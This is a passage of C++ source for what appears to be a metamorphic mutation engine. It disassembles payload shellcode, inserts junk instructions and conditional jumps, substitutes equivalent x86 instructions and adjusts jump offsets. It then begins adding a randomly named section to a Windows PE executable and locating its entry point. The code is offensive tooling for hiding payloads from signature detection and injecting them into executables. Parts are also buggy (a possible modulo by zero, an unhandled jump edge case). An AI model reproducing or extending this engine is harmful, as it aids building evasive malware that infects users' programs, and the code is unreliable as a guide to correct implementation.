                std::cout << "OH NO IT IS NO LONGER A NEAR JUMP. PLEASE ALSO IMLEMENT THIS EDGE CASE " << std::endl;
                //exit(-1);
            }

            bytes_vec[1] -= machine_code_num_of_bytes;
            jump_instruction.set_bytes_vec(bytes_vec);

            std::cout << "After : Jump instruction bytes : ";
            for (int i = 0; i < bytes_vec.size(); i++)
            {
                std::cout << convert_byte_to_string(bytes_vec[i]) << " ";
            }
        }
        else
        {
            std::cout << "[ - ] Negative offset jump but insertion @ 0x" << std::hex << address_of_insertion << " is not within" << std::endl;
            std::cout << "\nJumping from 0x" << std::hex << jump_instruction.get_address() << " to 0x" << std::hex <<
                (jump_instruction.get_address() + jump_instruction.get_twos_complement_offset()) << std::endl;
        }

        std::cout << "Jump instruction bytes : ";
        std::vector<unsigned char> bytes_vec = jump_instruction.get_bytes_vec();

        for (int i = 0; i < bytes_vec.size(); i++) 
		{
            std::cout << convert_byte_to_string(bytes_vec[i]) << " ";
        }
		
        std::cout << "\nJumping from 0x" << std::hex << jump_instruction.get_address() << " to 0x" << std::hex <<
            (jump_instruction.get_address() + jump_instruction.get_twos_complement_offset()) << std::endl;
        std::cout << std::endl;
    }
}

//check if its a signed bit
unsigned char Morph_Executable_Controller::calculate_signed_bit(char original_relative_offset)
{
    unsigned char signed_bit = 0;

    //check if positive or negative values twos complement
    if (original_relative_offset > 0)
    {
        signed_bit = 0;
    }
    else if (original_relative_offset < 0)
    {
        signed_bit = 1;
    }

    return signed_bit;
}

//modifying the new jump instructions
void Morph_Executable_Controller::modify_jumps_in_dis_asm_vec(std::vector<Disassembly> &dis_asm_vec,
                                                              std::vector<Disassembly> &jump_instructions_vec)
{
    //put the new machine code bytes into orignal dis_asm_vec
    for (int i = 0; i < dis_asm_vec.size();i++)
    {
        for (int j = 0; j < jump_instructions_vec.size(); j++)
        {
            if (dis_asm_vec[i].get_address() == jump_instructions_vec[j].get_address())
            {
                dis_asm_vec[i].set_bytes_vec(jump_instructions_vec[j].get_bytes_vec());
            }
        }
    }
}

//adding condictional jumps
void Morph_Executable_Controller::add_conditional_jumps_instructions(std::vector<Disassembly> &dis_asm_vec,
                                                                     std::vector<unsigned char> &machine_code_vec,
                                                                     size_t &machine_code_num_of_bytes)

{
    for(int i = 0; i < dis_asm_vec.size(); i++)
    {
        if( dis_asm_vec[i].get_not_in_jump() == true &&
                dis_asm_vec[i].get_modified_status() == false)//if it is not within jump and not yet modified
        {
            int chance = rand() % 100;//used for variance
            if(to_insert_or_not(chance) == true)
            {
                //generate conditional jump instructions
                std::string new_instruction = generate_conditional_jumps_instructions() +
                                              dis_asm_vec[i].get_full_instruction() + ";";

                gen_new_machine_code(dis_asm_vec[i],new_instruction,machine_code_vec,machine_code_num_of_bytes);
            }
        }
    }
}

//adding junk instructions
void Morph_Executable_Controller::add_junk_instructions(std::vector<unsigned char> &payload_vec,
                                                                std::vector<Disassembly> &dis_asm_vec,
                                                                std::vector<unsigned char> &machine_code_vec,
                                                                size_t &machine_code_num_of_bytes,
                                                                std::vector<uint64_t> &address_of_insertions_vec,
                                                                std::vector<Disassembly> &jump_instructions_vec)
{
    QString morph_status = QString("");

    //first need to disassemble the payload shellcode to asm instructions
    morph_status = machine_code_to_asm(payload_vec, dis_asm_vec);
    error_warning_message_box(morph_status);

    //checking can erase later
    //print_dis_asm_vec(dis_asm_vec);

    //get the junk code stored inside machine code vec
    morph_status = junk_code_generator(machine_code_vec, machine_code_num_of_bytes);
    error_warning_message_box(morph_status);

    //randomize chances of adding junk code
    //need to store which address it is being inserted at
    //also need to store which of the original disassembled code is a jump instructions
    randomize_and_store_insertions(address_of_insertions_vec, jump_instructions_vec, dis_asm_vec);

    //need to store the original data of the jump_vec
    //as changes will be made in jump_vec
    std::vector<Disassembly> tracker_vec;
    init_tracker_vec(tracker_vec, jump_instructions_vec);

    calculate_and_adjust_offsets_within_jump_range(address_of_insertions_vec,
                                                        jump_instructions_vec,
                                                        tracker_vec,
                                                        machine_code_num_of_bytes);

    //place the modified jump bytes into the dis_asm_vec
    modify_jumps_in_dis_asm_vec(dis_asm_vec, jump_instructions_vec);

    modify_payload_vec_with_junk_instructions(address_of_insertions_vec,
                                                            dis_asm_vec,
                                                            machine_code_vec,
                                                            payload_vec);

    std::cout << std::endl << std::endl;
    dis_asm_vec.clear();
    morph_status = machine_code_to_asm(payload_vec, dis_asm_vec);
    error_warning_message_box(morph_status);

    //print_dis_asm_vec(dis_asm_vec);
    std::cout << std::endl << std::endl;

    for (int i = 0; i < payload_vec.size(); i++)
    {
        std::cout  << convert_byte_to_string(payload_vec[i]);
    }

    std::cout << std::endl;
}

//add into the payload vector the junk instructions
void Morph_Executable_Controller::modify_payload_vec_with_junk_instructions(std::vector<uint64_t> &address_of_insertions_vec,
                                                                            std::vector<Disassembly> &dis_asm_vec,
                                                                            std::vector<unsigned char> &machine_code_vec,
                                                                            std::vector<unsigned char> &payload_vec)

{
    payload_vec.clear();


    for (int i = 0; i < dis_asm_vec.size(); i++)
    {
        bool toInsert = false;

        for (int j = 0; j < address_of_insertions_vec.size(); j++)
        {
            if (dis_asm_vec[i].get_address() == address_of_insertions_vec[j])
            {
                toInsert = true;//if it is to be inserted
                address_of_insertions_vec.erase(address_of_insertions_vec.begin() + j);
            }
        }

        if (toInsert == true)
        {
            //putting in the junk code
            for (int k = 0; k < machine_code_vec.size(); k++)
            {
                payload_vec.emplace_back(machine_code_vec[k]);
            }
            i--;//so can get back the original instructions
        }
        else
        {
            std::vector<unsigned char> bytes_vec = dis_asm_vec[i].get_bytes_vec();
            for (int k = 0; k < bytes_vec.size(); k++)
            {
                payload_vec.emplace_back(bytes_vec[k]);
            }
        }
    }
}

// ======================================== END OF JUNK INSTRUCTIONS & Conditional Jump ===============================

// ======================================== ALT INSTRUCTIONS ======================================

//add the alternative instructions to the payload
void Morph_Executable_Controller::modify_payload_vec_with_alternative_instructions(std::vector<unsigned char> &payload_vec,
                                                                                   std::vector<Disassembly> &dis_asm_vec)
{
    payload_vec.clear();

    for(int i = 0; i < dis_asm_vec.size(); i++)
    {
        std::vector<unsigned char> bytes_vec = dis_asm_vec[i].get_bytes_vec();
        for(int j = 0; j < bytes_vec.size(); j++)
        {
            payload_vec.emplace_back(bytes_vec[j]);
        }
    }
}

//checking if it is a jump instruction
void Morph_Executable_Controller::check_for_relative_jumps(std::vector<Disassembly> &dis_asm_vec)
{
    //i'll search for any relative jump instructions
    std::string regs_array[] = {"eax","edx","ecx","ebx","edi","esi","ebp","esp"}; // to compare, if the instruction string contains these registers

    for(int i = 0; i < dis_asm_vec.size(); i++)
    {
        //now i will check for these relative jumps
        //this will get back the instruction, i.e. je, jne, ja
        std::string mnemonic = dis_asm_vec[i].get_mnemonic();
        bool has_relative_jmp = false;

        // this is checking for all the jump statements (not including call)
        if(dis_asm_vec[i].get_id() >= 253 && dis_asm_vec[i].get_id() <= 270)
        {
            has_relative_jmp = true;
            std::cout << "FOUND 1: " <<  mnemonic << std::endl;
        }
        else if(mnemonic.compare("call") == 0)//if the mnemonic is "call" instruction
        {
            std::cout << "FOUND CALL: "  << mnemonic << std::endl;
            //check if its not a register
            std::string ops = dis_asm_vec[i].get_ops(); // this should be the address
            for(std::string reg : regs_array)
            {
                if(ops.find(reg) != std::string::npos) // != means it contains the register
                {
                    std::cout << "FOUND: " << reg << " != " << ops << std::endl;
                    has_relative_jmp = false;
                    break;
                }
                else//this is not a register, it is an address, hence it has a relative jump
                {
                    std::cout << "Checking: " << reg << " ? " << ops << std::endl;
                    has_relative_jmp = true;
                }
            }
        }
		
        if(has_relative_jmp == true)
        {
            std::cout << "HAS RELATIVE JUMP: " << dis_asm_vec[i].get_full_instruction() << std::endl;
            dis_asm_vec[i].set_not_in_jump(false); // dont modify this address, as it has relative jump byte

            check_not_in_jump(dis_asm_vec,i);
        }
    }
}

//check if instructions is within a jump
void Morph_Executable_Controller::check_not_in_jump(std::vector<Disassembly> &dis_asm_vec, int index)
{

    //dont modify anything from this address to the destination address
    //note that the instruction is something like je/jne [address], hence the check here will be different

    //now to count from this address till the destination address

    unsigned int starting_address = dis_asm_vec[index].get_address();
    unsigned int destination_address = starting_address + dis_asm_vec[index].get_twos_complement_offset();

    unsigned char signed_bit = calculate_signed_bit(dis_asm_vec[index].get_twos_complement_offset());

    //i will run through the forloop again, and check for any address between destination hex and this relative jump instruction address
    for(int x = 0; x < dis_asm_vec.size(); x++)
    {
        unsigned int address_of_insertion = dis_asm_vec[x].get_address();

        if(signed_bit == 1)//this would mean the destination is negative (before the jne address)
        {
            // if dis_asm_vec[x].get_address() is inbetween start and jump
            if(address_of_insertion <= starting_address &&
                    address_of_insertion > destination_address)
            {
                std::cout << "has relative -ve : ";
                std::cout << std::hex << dis_asm_vec[x].get_address();
                std::cout << " is between " << starting_address << " and " << destination_address
                          << std::endl << std::endl;
                dis_asm_vec[x].set_not_in_jump(false);
            }
        }
        else if(signed_bit == 0) // destination is positive (after the jne address)
        {
            if(address_of_insertion > starting_address &&
                    address_of_insertion <= destination_address)// if dis_asm_vec[x].address is inbetween start and jump
            {
                std::cout << "has relative +ve : ";
                std::cout << std::hex << dis_asm_vec[x].get_address();
                std::cout << " is between " << starting_address << " and " << destination_address
                          << std::endl << std::endl;
                dis_asm_vec[x].set_not_in_jump(false);
            }
        }
    }
}

//generating the new instructions to machine code
void Morph_Executable_Controller::gen_new_machine_code(Disassembly &instruction,
                                                       std::string new_instruction,
                                                       std::vector<unsigned char> &machine_code_vec,
                                                       size_t &machine_code_num_of_bytes)
{
        std::cout << "OLD INSTRUCTION: " << instruction.get_full_instruction() << std::endl;
        instruction.set_full_instruction(new_instruction);
        std::cout << "NEW INSTRUCTION: " << instruction.get_full_instruction() << std::endl;

        //now to get the new bytes for the machine code
        machine_code_vec.clear();
        QString morph_status = asm_to_machine_code(instruction.get_full_instruction(),
                                             machine_code_vec,
                                             machine_code_num_of_bytes);

        error_warning_message_box(morph_status);

        std::vector<unsigned char> bytes_vec;

        for(int i = 0; i < machine_code_vec.size(); i++)
        {
            bytes_vec.emplace_back(machine_code_vec[i]);
        }

        instruction.set_bytes_vec(bytes_vec);
        instruction.set_modified_true();
        std::cout << std::endl;
}

//alt inc or dec asm
void Morph_Executable_Controller::alternative_inc_or_dec_instruction(std::vector<Disassembly> &dis_asm_vec,
                                                         std::vector<unsigned char> &machine_code_vec,
                                                         size_t &machine_code_num_of_bytes)
{
    int dec_id = 133;
    int inc_id = 215;

    for(int i = 0; i < dis_asm_vec.size() ; i++)
    {
        if(dis_asm_vec[i].get_not_in_jump() == true &&
                dis_asm_vec[i].get_modified_status() == false)//if its not within jump and not yet modified
        {
            std::string reg = dis_asm_vec[i].get_ops();
            std::string new_instruction = "";
            //we can add junk code, e.g. inc then dec again as well.
            if(dis_asm_vec[i].get_id() == inc_id) //substitute inc with add 1
            {
                new_instruction += "add " + reg + ", 1;";

                gen_new_machine_code(dis_asm_vec[i],
                                     new_instruction,
                                     machine_code_vec,
                                     machine_code_num_of_bytes);
            }
            //we can add junk code, e.g. inc then dec again as well.
            else if(dis_asm_vec[i].get_id() == dec_id) //substitute dec with sub 1
            {
                new_instruction += "sub " + reg + ", 1;";

                gen_new_machine_code(dis_asm_vec[i],
                                     new_instruction,
                                     machine_code_vec,
                                     machine_code_num_of_bytes);
            }
        }
    }
}

//check if the asm syntax contains a pointer liek mov eax, dword ptr [0x234]
bool Morph_Executable_Controller::check_instruction_is_ptr(std::string ops)
{
    if(ops.find("]") != std::string::npos)//found a [ ], means its a pointer
    {
        return true;
    }

    return false;
}

//alt sub instruction 
std::string Morph_Executable_Controller::generate_alternative_sub_instructions(std::string original_instruction,
                                                                               std::string right_op,
                                                                               std::string left_op,
                                                                                bool right_op_is_reg,
                                                                               unsigned int &right_op_hex)
{
    std::string new_instruction = original_instruction;

    int chance = (rand()% 100);
    if(to_insert_or_not(chance) == true)
    {
        if(right_op_is_reg == true)
        {
            //generate the lea alternative
            //lea reg1, [reg1 - reg2 * 1];
            new_instruction = "lea ";
            new_instruction += left_op + ",";
            new_instruction += " [" + left_op + " - " + right_op + " * " + " 1];";
        }
        else
        {
            std::string dec_instruction = "";
            new_instruction = "";
            //generate a random number, between 0 to value - 1
            int divisor = (rand() % right_op_hex);
            int remainder = right_op_hex % divisor;
            right_op_hex = right_op_hex - remainder;

            if(remainder != 0)
            {
                for(int a = 0; a < remainder; a++)
                {
                    //can also dec reg1, remainder or sub reg1, 1
                    int chance = (rand() % 100); // chance to either use dec or sub
                    if (to_insert_or_not(chance) == true)
                    {
                        dec_instruction += "dec " + left_op + ";";
                    }
                    else
                    {
                        dec_instruction += "sub " + left_op + ", 1;"; // sub will take alot of bytes
                        //we can also choose to sub the entire remainder, sub reg, remainder; --> another way
                    }
                }
            }

            //seperate the sub reg, num based on the result of value / rand_num
            //e.g. sub reg, 12 becomes sub reg ,4; sub reg, 4; sub reg, 4;
            for(int x = 0; x < divisor; x++)
            {
                new_instruction += "sub " + left_op + ", " ;
                new_instruction += convert_num_to_hex((right_op_hex / divisor)) + ";";
            }
            new_instruction = new_instruction + dec_instruction;
        }
    }
    return new_instruction;
}

void Morph_Executable_Controller::alternative_sub_instruction(std::vector<Disassembly> &dis_asm_vec,
                                                              std::vector<unsigned char> &machine_code_vec,
                                                              size_t &machine_code_num_of_bytes)
{
    std::string regs_array[] = {"eax","edx","ecx","ebx","edi","esi","esp","ebp"}; // may not want to touch edi, esi, see how
    //add alternative with number e.g. add eax, 0x24;
    //add alternative with 2 registers
    unsigned int sub_id = 333;

    for(int i = 0; i < dis_asm_vec.size() ; i++)
    {
        if(dis_asm_vec[i].get_not_in_jump() == true &&
                dis_asm_vec[i].get_modified_status() == false)
        {
            bool right_op_is_reg = false;
            std::string ops = dis_asm_vec[i].get_ops();
            if(dis_asm_vec[i].get_id() == sub_id)
            {
                if(check_instruction_is_ptr(ops) == false) //if not a pointer
                {

                    std::string right_op = ops.substr(ops.find_first_of(",")+1,ops.length());
                    std::string left_op = ops.substr(0,ops.find_first_of(","));

                    for(std::string reg : regs_array)
                    {
                        if(right_op.find(reg) != std::string::npos)
                        {
                            right_op_is_reg = true;
                            break;
                        }
                    }

                    unsigned int right_op_hex = dis_asm_vec[i].convert_string_to_hex(right_op);
                    std::string original_instruction = dis_asm_vec[i].get_full_instruction();
                    std::string new_instruction = generate_alternative_sub_instructions(original_instruction,
                                                                                        right_op,
                                                                                        left_op,
                                                                                        right_op_is_reg,
                                                                                        right_op_hex);

                    //now reassigning back the new instruction
                    gen_new_machine_code(dis_asm_vec[i],new_instruction,machine_code_vec,machine_code_num_of_bytes);
                }
            }
        }
    }
}

//alt add instructions
std::string Morph_Executable_Controller::generate_alternative_add_instructions(std::string original_instruction,
                                                                               std::string right_op,
                                                                               std::string left_op,
                                                                                bool right_op_is_reg,
                                                                               unsigned int &right_op_hex)
{
    std::string new_instruction = original_instruction;

    int chance = (rand()% 100);
    if(to_insert_or_not(chance) == true)
    {
        if(right_op_is_reg == true)
        {
            //generate the lea alternative
            //lea reg1, [reg1 - reg2 * 1];
            new_instruction = "lea ";
            new_instruction += left_op + ",";
            new_instruction += " [" + left_op + " + " + right_op + " * " + " 1];";
        }
        else
        {
            std::string dec_instruction = "";
            new_instruction = "";
            //generate a random number, between 0 to value - 1
            int divisor = (rand() % right_op_hex);
            int remainder = right_op_hex % divisor;
            right_op_hex = right_op_hex - remainder;

            if(remainder != 0)
            {
                for(int a = 0; a < remainder; a++)
                {
                    //can also dec reg1, remainder or sub reg1, 1
                    int chance = (rand() % 100); // chance to either use dec or sub
                    if (to_insert_or_not(chance) == true)
                    {
                        dec_instruction += "inc " + left_op + ";";
                    }
                    else
                    {
                        dec_instruction += "add " + left_op + ", 1;"; // sub will take alot of bytes
                        //we can also choose to sub the entire remainder, sub reg, remainder; --> another way
                    }
                }
            }

            //seperate the sub reg, num based on the result of value / rand_num
            //e.g. sub reg, 12 becomes sub reg ,4; sub reg, 4; sub reg, 4;
            for(int x = 0; x < divisor; x++)
            {
                new_instruction += "add " + left_op + ", " ;
                new_instruction += convert_num_to_hex((right_op_hex / divisor)) + ";";
            }
            new_instruction = new_instruction + dec_instruction;
        }
    }
	
    return new_instruction;
}

void Morph_Executable_Controller::alternative_add_instruction(std::vector<Disassembly> &dis_asm_vec,
                                                              std::vector<unsigned char> &machine_code_vec,
                                                              size_t &machine_code_num_of_bytes)
{
    std::string regs_array[] = {"eax","edx","ecx","ebx","edi","esi","esp","ebp"}; // may not want to touch edi, esi, see how
    //add alternative with number e.g. add eax, 0x24;
    //add alternative with 2 registers
    unsigned int add_id = 8;

    for(int i = 0; i < dis_asm_vec.size() ; i++)
    {
        if(dis_asm_vec[i].get_not_in_jump() == true &&
                dis_asm_vec[i].get_modified_status() == false)
        {
            bool right_op_is_reg = false;
            std::string ops = dis_asm_vec[i].get_ops();
            if(dis_asm_vec[i].get_id() == add_id)
            {
                if(check_instruction_is_ptr(ops) == false) //if not a pointer
                {
					//use substring to get right and left operands
                    std::string right_op = ops.substr(ops.find_first_of(",")+1,ops.length());
                    std::string left_op = ops.substr(0,ops.find_first_of(","));

                    for(std::string reg : regs_array)
                    {
                        if(right_op.find(reg) != std::string::npos)
                        {
                            right_op_is_reg = true;
                            break;
                        }
                    }
					
					//modify only if the right operand is a register
                    unsigned int right_op_hex = dis_asm_vec[i].convert_string_to_hex(right_op);
                    std::string original_instruction = dis_asm_vec[i].get_full_instruction();
                    std::string new_instruction = generate_alternative_add_instructions(original_instruction,
                                                                                        right_op,
                                                                                        left_op,
                                                                                        right_op_is_reg,
                                                                                        right_op_hex);

                    //now reassigning back the new instruction
                    gen_new_machine_code(dis_asm_vec[i],new_instruction,machine_code_vec,machine_code_num_of_bytes);
                }
            }
        }
    }
}

//alt xor clearing
void Morph_Executable_Controller::alternative_xor_clear_instruction(std::vector<Disassembly> &dis_asm_vec,
                                                          std::vector<unsigned char> &machine_code_vec,
                                                          size_t &machine_code_num_of_bytes)
{
    int xor_id = 334;

    std::vector<std::string> alt_xor_clear_reg
            = {"sub REG, REG ;","and REG, 0 ;", "mov REG, 0 ;"};

    for(int i = 0; i < dis_asm_vec.size(); i++)
    {
        //for xor
        if( dis_asm_vec[i].get_not_in_jump() == true &&
                dis_asm_vec[i].get_modified_status() == false)
        {
            if(dis_asm_vec[i].get_id() == xor_id)
            {
				//substring of left and right ops
                std::string ops = dis_asm_vec[i].get_ops();
                std::string left_op = ops.substr(0,ops.find_first_of(","));
                std::string right_op = ops.substr(ops.find_first_of(",")+1,ops.length());

                //if both registers in left op and right op are the same
                if(right_op.find(left_op)!= std::string::npos)
                {
                    int chance = rand() % 100;//used for variance
                    if(to_insert_or_not(chance)==true)
                    {
                        //select a random index from alt_xor_clear_reg
                        std::string new_instruction = alt_xor_clear_reg[rand() % alt_xor_clear_reg.size()];

                        //i will use regex to do this, c++ 11 needed
                        //this will replace every instance of "REG" inside alt_xor_clear_reg to the left_op
                        new_instruction = std::regex_replace(new_instruction,std::regex("\\REG"),left_op);

                        //junk xor code here
                        new_instruction += "xor " + left_op + ", 1;";
                        new_instruction += "xor " + left_op + ", 1;";

                        gen_new_machine_code(dis_asm_vec[i],new_instruction,machine_code_vec,machine_code_num_of_bytes);
                    }
                }
            }
        }
    }
}

//alt general xor instructions
void Morph_Executable_Controller::alternative_xor_general_instruction(std::vector<Disassembly> &dis_asm_vec,
                        
						std::vector<unsigned char> &machine_code_vec,
                                                        size_t &machine_code_num_of_bytes)
{
    int xor_id = 334;
    std::string regs_array[] = {"eax","edx","ecx","ebx","edi","esi","ebp","esp"}; // to compare, if the instruction string contains these registers

    for(auto i = 0; i < dis_asm_vec.size(); i++)
    {
        if(dis_asm_vec[i].get_not_in_jump() == true &&
                dis_asm_vec[i].get_modified_status() == false)
        {
            if(dis_asm_vec.at(i).get_id() == xor_id )
            {
				//substring of left and right ops
                std::string ops = dis_asm_vec[i].get_ops();
                std::string left_op = ops.substr(0,ops.find_first_of(","));
                std::string right_op = ops.substr(ops.find_first_of(",")+1,ops.length());

                //using a third register to accomplish the xor, using and not, and, or
                //note that we are storing in left op

                bool right_op_is_reg = false;
                for(std::string reg : regs_array)
                {
                    if(right_op.find(reg) != std::string::npos)
                    {
                        right_op_is_reg = true;
                        break;
                    }
                }

                //they cannot be the same (left op != right op)
                if(right_op.find(left_op) == std::string::npos && right_op_is_reg == true)
                {
                    int chance = (rand() % 100);
                    if(to_insert_or_not(chance) == true)
                    {
                        std::string extra_reg = "";
                        std::string new_instruction = "";

                        for(int j = 0; j < 8; j++)
                        {
                            extra_reg = regs_array[j];
                            if(left_op.find(extra_reg) == std::string::npos
                                    && right_op.find(extra_reg) == std::string::npos)
                            {
                                std::cout << "EXTRA REG IS: " << extra_reg << " with: "
                                          << left_op << " & " << right_op << std::endl;
                                break;
                            }
                        }

                        //starting doing the alternate
                        new_instruction += "push " + extra_reg + ";"; // the extra register we've chosen is stored in reg3
                        new_instruction += "push " + right_op + ";";
                        new_instruction += "push " + left_op + ";";
                        new_instruction += "or "   + left_op + ", " + right_op + ";";
                        new_instruction += "mov "  + extra_reg + ", " + left_op + ";";
                        new_instruction += "pop "  + left_op + ";";
                        new_instruction += "pop "  + right_op + ";";
                        new_instruction += "not "  + right_op + ";";
                        new_instruction += "not "  + left_op + ";";
                        new_instruction += "or "   + left_op + ", " + right_op + ";";
                        new_instruction += "and "  + left_op + ", " + extra_reg + ";";
                        new_instruction += "pop "  + extra_reg + ";";
                        std::cout << "NEW INSTRUCTION: " << new_instruction << std::endl;

                        gen_new_machine_code(dis_asm_vec[i],new_instruction,machine_code_vec,machine_code_num_of_bytes);
                    }
                }
            }
        }
    }
}

//alr and instructions
void Morph_Executable_Controller::alternative_and_instruction(std::vector<Disassembly> &dis_asm_vec,
                                                     std::vector<unsigned char> &machine_code_vec,
                                                     size_t &machine_code_num_of_bytes)
{
    unsigned int and_id = 25;
    std::string regs_array[] = {"eax","edx","ecx","ebx","edi","esi","esp","ebp"}; // to compare, if the instruction string contains these registers

    for(int i = 0; i < dis_asm_vec.size(); i++)
    {
        if(dis_asm_vec[i].get_not_in_jump() == true &&
                dis_asm_vec[i].get_modified_status() == false)
        {
            if(dis_asm_vec[i].get_id() == and_id)
            {
                std::string ops = dis_asm_vec.at(i).get_ops();
                std::string left_op = ops.substr(0,ops.find_first_of(","));
                std::string right_op = ops.substr(ops.find_first_of(",")+1,ops.length());

                bool right_op_is_reg = false;
                if(check_instruction_is_ptr(right_op) == false)
                {
                    for(int j = 0; j < 8; j++)
                    {
                        if(right_op.find(regs_array[j]) != std::string::npos)
                        {
                            //if right_op contains any of the registers
                            right_op_is_reg = true;
                            break;
                        }
                    }
                }
                if(right_op_is_reg == false)
                {
                    int chance = (rand() % 100);

                    if(to_insert_or_not(chance) == true)
                    {
                        //this is the bulk of the new instruction code
                        std::string extra_reg = "";
                        std::string new_instruction = "";

                        for(int j = 0; j < 8; j++)
                        {
                            extra_reg = regs_array[j];
                            if(left_op.find(extra_reg) == std::string::npos
                                    && right_op.find(extra_reg) == std::string::npos)
                            {
                                std::cout << "EXTRA REG IS: " << extra_reg << " with: "
                                          << left_op << " & " << right_op << std::endl;
                                break;
                            }
                        }
                        //converts the right value to hex, i.e. and eax, 0xfff , value = 0xfff

                        int right_op_hex = dis_asm_vec[i].convert_string_to_hex(right_op);

                        new_instruction += "push " + extra_reg + ";";
                        new_instruction += "mov " + extra_reg + ", " + convert_num_to_hex(right_op_hex) + ";";
                        new_instruction += "and " + left_op + ", " + extra_reg + ";";
                        new_instruction += "pop " + extra_reg + ";";

                        gen_new_machine_code(dis_asm_vec[i],new_instruction,machine_code_vec,machine_code_num_of_bytes);
                    }
                }
            }
        }
    }
}

//alt push instructions
void Morph_Executable_Controller::alternative_push_instruction(std::vector<Disassembly> &dis_asm_vec,
                                                               std::vector<unsigned char> &machine_code_vec,
                                                               size_t &machine_code_num_of_bytes)
{
    int push_id = 588;
    std::string regs_array[] = {"eax","edx","ecx","ebx","edi","esi","ebp"};

    std::vector<std::string> alt_push_reg
            = {"mov dword ptr [esp - 4], REG ; sub esp, 4;",
               "sub esp, 4; mov dword ptr [esp], REG ;",
               "mov dword ptr [esp - 4], REG ; sub esp, 2; sub esp, 2;",
               "mov dword ptr [esp - 4], REG ; dec esp ; dec esp ; dec esp ; dec esp ;",
               "mov dword ptr [esp - 4], REG ; sub esp, 3 ; dec esp ;"};

    for(int i = 0; i < dis_asm_vec.size(); i++)
    {
        if( dis_asm_vec[i].get_not_in_jump() == true &&
                dis_asm_vec[i].get_modified_status() == false)
        {
            if(dis_asm_vec[i].get_id() == push_id)
            {
                std::string ops = dis_asm_vec[i].get_ops();
                bool ops_is_reg = false;

                for(std::string reg : regs_array)
                {
                    if(ops.find(reg) != std::string::npos)
                    {
                        ops_is_reg = true;
                        break;
                    }
                }

                if(ops_is_reg == true)
                {
                    int chance = rand() % 100;//used for variance
                    if(to_insert_or_not(chance)==true)
                    {
                        //select a random index from alt_xor_clear_reg
                        std::string new_instruction = alt_push_reg[rand() % alt_push_reg.size()];

                        //i will use regex to do this, c++ 11 needed
                        //this will replace every instance of "REG" inside alt_xor_clear_reg to the left_op
                        new_instruction = std::regex_replace(new_instruction,std::regex("\\REG"),ops);

                        gen_new_machine_code(dis_asm_vec[i],new_instruction,machine_code_vec,machine_code_num_of_bytes);
                    }
                }
            }
        }
    }
}

//alt pop instructions
void Morph_Executable_Controller::alternative_pop_instruction(std::vector<Disassembly> &dis_asm_vec,
                                                              std::vector<unsigned char> &machine_code_vec,
                                                              size_t &machine_code_num_of_bytes)
{
    int pop_id = 566;
    std::string regs_array[] = {"eax","edx","ecx","ebx","edi","esi","ebp"};

    std::vector<std::string> alt_pop_reg
            = {"add esp, 4 ;",
               "inc esp; add esp, 3;",
               "add esp, 2; add esp, 2;",
               "inc esp; inc esp; inc esp; inc esp;"};

    for(int i = 0; i < dis_asm_vec.size(); i++)
    {
        if( dis_asm_vec[i].get_not_in_jump() == true &&
                dis_asm_vec[i].get_modified_status() == false)
        {
            if(dis_asm_vec[i].get_id() == pop_id)
            {
                int chance = rand() % 100;//used for variance
                if(to_insert_or_not(chance)==true)
                {
                    //select a random index from alt_xor_clear_reg
                    std::string new_instruction = alt_pop_reg[rand() % alt_pop_reg.size()];
                    gen_new_machine_code(dis_asm_vec[i],new_instruction,machine_code_vec,machine_code_num_of_bytes);
                }
            }
        }
    }
}
// =========================================== END OF ALT INSTRUCTIONS =============================

//pop up a warning message box if exe error occurs
void Morph_Executable_Controller::error_warning_message_box(QString morph_status)
{

    if (morph_status == ERROR_FILE_NOT_FOUND)
    {
        QMessageBox::warning(cur_wind, "Warning",
                             "Exe file not found: " + this->original_exe_file_path);
    }
    else if (morph_status == ERROR_INVALID_DOS_SIGNATURE)
    {
        QMessageBox::warning(cur_wind, "Warning",
                             "Invalid DOS Signature");
    }
    else if (morph_status == ERROR_INVALID_PE_SIGNATURE)
    {
        QMessageBox::warning(cur_wind, "Warning",
                             "Invalid PE Signature");
    }
    else if (morph_status == ERROR_NO_MATCHING_SECTION_HEADER_NAME)
    {
        QMessageBox::warning(cur_wind, "Warning",
                             "No matching section header name for \".text\"");
    }
    else if(morph_status == ERROR_OPENING_KEYSTONE)
    {
        QMessageBox::warning(cur_wind, "Warning",
                             "Error opening keystone");
    }
    else if (morph_status == ERROR_ASSEMBLY_FAILED_KEYSTONE)
    {
        QMessageBox::warning(cur_wind, "Warning",
                             "Failed to assemble in keystone");
    }
    else if (morph_status == ERROR_OPENING_CAPSTONE)
    {
        QMessageBox::warning(cur_wind, "Warning",
                             "Error opening capstone");
    }
    else if (morph_status == ERROR_DISASSEMBLY_FAILED_CAPSTONE)
    {
        QMessageBox::warning(cur_wind, "Warning",
                             "Failed to disassemble in capstone");
    }
}


QString Morph_Executable_Controller::morph_exe_no_encryption(QString exe_file_path)
{
    //srand(time(NULL));
    QString morph_status = "";
    //reading bytes of a exe file
    morph_status = read_file_into_vector(exe_file_path);
    error_warning_message_box(morph_status);

    //get image dos header pointer
    //image_dos_header_file_cursor is at offset 0 as this pe header is located at the first offset of the exe
    this->dos_header_ptr = get_ptr_image_dos_header(this->buffer,this->image_dos_header_file_cursor);

    //validate the image dos header must be equals to MZ(ASCII)
    morph_status = validate_image_dos_signature(dos_header_ptr);
    error_warning_message_box(morph_status);


    // getting image_NT_header_cursor and setting exe_header_file_offset
    // Here we are assuming that buffer has the same bytes as the original file
    // so we need to get the exe_header_file_offset
    // which is the value of the e_lfanew attribute in dos_header_pointer
    this->image_NT_header_file_cursor = this->dos_header_ptr->e_lfanew;
    this->exe_header_file_offset = this->image_NT_header_file_cursor;

    // get the image_NT_header_ptr
    // the offset is at e_lfanew which is stored in image_NT_header_file_cursor
    this->image_NT_header_ptr = get_ptr_image_NT_header(this->buffer,image_NT_header_file_cursor);

    //validate the file PE signature must be equal to some dog shit
    morph_status = validate_PE_signature(image_NT_header_ptr);
    error_warning_message_box(morph_status);


    printf("Before: Number of Sections : 0x%x\n", this->image_NT_header_ptr->FileHeader.NumberOfSections);
    //increasing the number of sections to allocate memory for payload
    this->image_NT_header_ptr->FileHeader.NumberOfSections += 1;
    printf("After: Number of Sections : 0x%x\n", this->image_NT_header_ptr->FileHeader.NumberOfSections);

    //randomizing the new payload section name
    const std::string payload_section_name = randomize_payload_section_name();


     //this is the entry point when the pe file is loaded to virtual memory
    //must add image base + the address of entry point
    this->entry_point_of_text_section = this->image_NT_header_ptr->OptionalHeader.ImageBase + this->image_NT_header_ptr->OptionalHeader.AddressOfEntryPoint;
